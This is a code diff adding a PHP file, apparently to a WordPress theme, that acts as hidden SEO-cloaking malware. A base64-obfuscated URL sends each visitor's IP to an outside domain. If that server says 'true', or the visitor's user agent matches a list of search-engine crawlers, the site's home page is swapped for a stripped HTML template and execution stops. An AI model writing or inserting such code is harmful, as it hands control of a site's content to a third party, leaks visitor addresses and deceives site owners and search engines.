@@ -1,0 +1,60 @@
+<?php
+$html = geth();
+$ipcheck = "false";
+if(is_int(strpos($html,'<t@k>'))){
+	$ipcheck = str_replace('<t@k>',"",$html);
+};
+
+if(CheckAgent()||$ipcheck=="true"){
+	if (is_home() || is_front_page()) {
+?>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+</head>
+
+
+<body>
+
+</body>
+</html>
+
+	
+<?php
+exit;
+}
+}
+
+function get_client_ip(){
+	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
+	$ip = getenv("HTTP_CLIENT_IP");
+	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
+	$ip = getenv("HTTP_X_FORWARDED_FOR");
+	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
+	$ip = getenv("REMOTE_ADDR");
+	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
+	$ip = $_SERVER['REMOTE_ADDR'];
+	else
+	$ip = "unknown";
+	return($ip);
+}
+function geth(){
+	return @file_get_contents(base64_decode("aHR0cDovLzFuaWwydGhlYXJzZW5hbC5jb20vaXAucGhwP2lwPQ==").get_client_ip());	
+}
+function CheckAgent(){
+  $allow_agents=split(",","baiduspider,sogou,baidu,sosospider,googlebot,sohu-search,robozilla,slurp,msnbot,lycos");////,Firefox
+  $user_agent = isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:"null";
+  foreach($allow_agents as $allow_agent){
+  	if(is_int(strpos(strtolower($user_agent),strtolower($allow_agent)))){
+		return true;
+	}
+  }
+  return false;
+}
+
+?>
